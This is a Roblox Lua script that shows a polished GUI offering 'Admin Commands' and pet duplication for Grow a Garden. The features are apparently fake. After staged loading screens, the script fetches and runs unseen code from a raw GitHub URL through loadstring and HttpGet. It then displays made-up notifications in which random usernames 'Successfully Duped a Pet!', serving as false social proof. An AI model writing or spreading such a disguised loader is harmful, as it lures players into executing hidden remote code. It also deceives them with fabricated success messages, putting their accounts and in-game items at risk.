-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Cleanup
for _, gui in ipairs(playerGui:GetChildren()) do
    if gui.Name == "CustomGui" or gui.Name == "LoadingScreen"
    or gui.Name == "ScriptWaitUI" or gui.Name == "Notifications" then
        gui:Destroy()
    end
end

-- Load Notification System
local function showNotification(text)
    local gui = playerGui:FindFirstChild("Notifications") or Instance.new("ScreenGui", playerGui)
    gui.Name = "Notifications"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true

    local holder = gui:FindFirstChild("Holder")
    if not holder then
        holder = Instance.new("Frame", gui)
        holder.Name = "Holder"
        holder.Size = UDim2.new(0, 350, 1, 0)
        holder.Position = UDim2.new(1, -360, 0, 0)
        holder.BackgroundTransparency = 1

        local layout = Instance.new("UIListLayout", holder)
        layout.SortOrder = Enum.SortOrder.LayoutOrder
        layout.VerticalAlignment = Enum.VerticalAlignment.Bottom
        layout.Padding = UDim.new(0, 4)
    end

    local notif = Instance.new("Frame")
    notif.Size = UDim2.new(1, 0, 0, 60)
    notif.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    notif.BackgroundTransparency = 1
    notif.Parent = holder
    Instance.new("UICorner", notif).CornerRadius = UDim.new(0, 10)

    local txt = Instance.new("TextLabel", notif)
    txt.Size = UDim2.new(1, -20, 1, 0)
    txt.Position = UDim2.new(0, 10, 0, 0)
    txt.BackgroundTransparency = 1
    txt.Font = Enum.Font.GothamSemibold
    txt.TextColor3 = Color3.fromRGB(255, 255, 255)
    txt.TextSize = 20
    txt.TextXAlignment = Enum.TextXAlignment.Left
    txt.Text = text

    TweenService:Create(notif, TweenInfo.new(0.2), {BackgroundTransparency = 0}):Play()

    task.delay(1.5, function()
        TweenService:Create(notif, TweenInfo.new(0.2), {BackgroundTransparency = 1}):Play()
        task.delay(0.25, function() notif:Destroy() end)
    end)
end

-- Main GUI Setup
local mainGui = Instance.new("ScreenGui", playerGui)
mainGui.Name = "CustomGui"
mainGui.ResetOnSpawn = false
mainGui.IgnoreGuiInset = true

local frame = Instance.new("Frame", mainGui)
frame.Size = UDim2.new(0, 320, 0, 180)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

local layout = Instance.new("UIListLayout", frame)
layout.Padding = UDim.new(0, 12)
layout.FillDirection = Enum.FillDirection.Vertical
layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
layout.VerticalAlignment = Enum.VerticalAlignment.Center

local function createButton(text)
    local btn = Instance.new("TextButton", frame)
    btn.Size = UDim2.new(0.8, 0, 0, 45)
    btn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    btn.Font = Enum.Font.GothamSemibold
    btn.Text = text
    btn.TextSize = 22
    btn.TextColor3 = Color3.fromRGB(220, 220, 220)
    btn.AutoButtonColor = false
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)

    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 60, 60)}):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(45, 45, 45)}):Play()
    end)

    return btn
end

-- Fullscreen Loading Screen (3s)
local function showLoadingScreen(message, callback)
    local scr = Instance.new("ScreenGui", playerGui)
    scr.Name = "LoadingScreen"
    scr.IgnoreGuiInset = true
    scr.ResetOnSpawn = false

    local bg = Instance.new("Frame", scr)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)

    local box = Instance.new("Frame", bg)
    box.Size = UDim2.new(0.6, 0, 0.3, 0)
    box.Position = UDim2.new(0.5, 0, 0.5, 0)
    box.AnchorPoint = Vector2.new(0.5, 0.5)
    box.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 12)

    local lbl = Instance.new("TextLabel", box)
    lbl.Size = UDim2.new(0.9, 0, 0.3, 0)
    lbl.Position = UDim2.new(0.5, 0, 0.25, 0)
    lbl.AnchorPoint = Vector2.new(0.5, 0.5)
    lbl.BackgroundTransparency = 1
    lbl.Font = Enum.Font.GothamBold
    lbl.TextColor3 = Color3.fromRGB(240, 240, 240)
    lbl.TextSize = 24
    lbl.TextWrapped = true
    lbl.Text = message

    task.spawn(function()
        wait(3)
        scr:Destroy()
        callback()
    end)
end

-- Post-load Animated Script Wait UI (max 30s)
local function showScriptWait()
    local scr = Instance.new("ScreenGui", playerGui)
    scr.Name = "ScriptWaitUI"
    scr.IgnoreGuiInset = true
    scr.ResetOnSpawn = false

    local lbl = Instance.new("TextLabel", scr)
    lbl.Size = UDim2.new(0, 500, 0, 80)
    lbl.Position = UDim2.new(0.5, 0, 0.5, 0)
    lbl.AnchorPoint = Vector2.new(0.5, 0.5)
    lbl.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 22
    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    lbl.Text = "Loading Script Please Wait…"
    Instance.new("UICorner", lbl).CornerRadius = UDim.new(0, 16)

    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
    TweenService:Create(lbl, tweenInfo, {BackgroundTransparency = 0.2}):Play()

    task.delay(30, function()
        scr:Destroy()
    end)
end

-- On Button Click
local function onClick(isDupe)
    mainGui.Enabled = false
    local message = isDupe
        and "Finding A Compatible Server to Duplicate…"
        or "Finding A Compatible Server For Admin Commands…"

    showLoadingScreen(message, function()
        showScriptWait()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/lowznt/growagarden/refs/heads/main/growagarden.lua"))()
        end)

        local names = {"MasterMaker321","DarkBlade77","PixelPro456","VoidHunter","Slayer202"}
        for i = 1, 3 do
            task.delay(i * 0.1, function()
                showNotification(names[math.random(#names)] .. " Successfully Duped a Pet!")
            end)
        end
    end)
end

-- Buttons
local adminBtn = createButton("Admin Commands")
adminBtn.MouseButton1Click:Connect(function() onClick(false) end)

local dupeBtn = createButton("Dupe Now!")
dupeBtn.MouseButton1Click:Connect(function() onClick(true) end)
